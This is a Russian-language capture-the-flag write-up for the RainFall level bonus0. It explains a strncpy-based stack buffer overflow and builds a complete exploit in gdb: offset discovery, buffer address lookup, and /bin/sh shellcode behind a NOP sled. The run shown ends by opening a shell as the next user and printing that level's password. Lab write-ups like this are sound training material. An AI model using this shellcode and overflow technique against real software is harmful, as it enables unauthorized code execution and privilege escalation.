Мы можем найти исполняемый файл, ожидающий двух входных данных, и распечатать их, разделив пробелом :

#bonus0@RainFall:~$ ./bonus0
# -
#bla
# -
#blabla
#bla blabla
#bonus0@RainFall:~$

Проанализировав его с помощью gdb, мы можем найти три интересные функции: main(), pp() и p().
Пожалуйста, обратитесь к файлу asm_analysis.md параллельно с источником.c для полных объяснений.
Мы видим, что в функции p() мы можем прочитать 4096 символов в буфере, не заканчивающемся нулем. Затем strncpy() вызывается для копирования первых 20 байтов (или меньше, если буфер, конечно, меньше 20 символов), но, как сказал мужчина :
"Если исходная строка имеет размер, больший, чем указанный в параметре, то полученная строка не будет заканчиваться нулевым кодом ASCII (символ '\0')".
Таким образом, основной буфер должен выглядеть следующим образом :
arg1 + arg2 + пробел + arg2 -> если значение arg1 не равно нулю (если первый ввод содержит 20 символов или более), но значение arg2 равно нулю (2-й ввод короче 20 символов).
Так что мы можем скопировать 40 + 1 + 20 (61) символы в буфер размером 42 => у нас будет 19 байт для записи по адресу eip. Позволяет найти смещение :

(gdb) run
Starting program: /home/user/bonus0/bonus0
 - 
01234567890123456789
 -
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
01234567890123456789Aa0Aa1Aa2Aa3Aa4Aa5Aa Aa0Aa1Aa2Aa3Aa4Aa5Aa

Program received signal SIGSEGV, Segmentation fault.
0x41336141 in ?? ()
(gdb) info registers
eax            0x0      0
ecx            0xffffffff       -1
edx            0xb7fd28b8       -1208145736
ebx            0xb7fd0ff4       -1208152076
esp            0xbffff740       0xbffff740
ebp            0x32614131       0x32614131
esi            0x0      0
edi            0x0      0
eip            0x41336141       0x41336141
eflags         0x210282 [ SF IF RF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
(gdb)

1-й шаг: Создайте наш первый ввод с заполнением инструкций NOP размером более 61 байта и меньше [4096 байт - наш шелл-код]
        100 * Инструкция NOP + \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
        2-й шаг: Узнайте адрес буфера[4096], чтобы определить адрес между началом нашего буфера +61 и концом инструкций NOP.

(gdb) set disassembly-flavor intel
(gdb) disass p
Dump of assembler code for function p:
[...]
   0x080484d0 <+28>:    lea    eax,[ebp-0x1008
[...]
(gdb) b *p+28
Breakpoint 1 at 0x80484d0
(gdb) run
Starting program: /home/user/bonus0/bonus0
 - 

Breakpoint 1, 0x080484d0 in p ()
(gdb) x $ebp-0x1008
0xbfffe680:     0x00000000
(gdb)
3rd step : Final exploit

    1st arg = python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'
    2nd arg = python -c 'print "A" * 9 + "\xd0\xe6\xff\xbf" + "B" * 7'

bonus0@RainFall:~$ (python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "A" * 9 + "\xd0\xe6\xff\xbf" + "B" * 7'; cat) | ./bonus0
 - 
 - 
AAAAAAAAABBBBBBB AAAAAAAAABBBBBBB
whoami
bonus1
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
^C
bonus0@RainFall:~$ su bonus1
